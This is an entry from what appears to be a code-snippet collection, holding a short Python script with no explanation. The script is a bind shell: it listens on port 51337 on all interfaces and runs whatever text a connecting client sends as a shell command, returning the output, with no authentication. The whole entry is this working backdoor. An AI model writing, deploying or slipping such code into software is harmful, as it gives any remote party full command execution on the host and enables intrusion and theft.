---
id: e4d6a3cd-ab8c-4af6-876c-e306c991c050
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:08.776991+00:00'
updated_at: '2023-04-10T20:21:16.295744+00:00'
---

# Code Snippet e4d6a3cd

**Language**: Python

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```


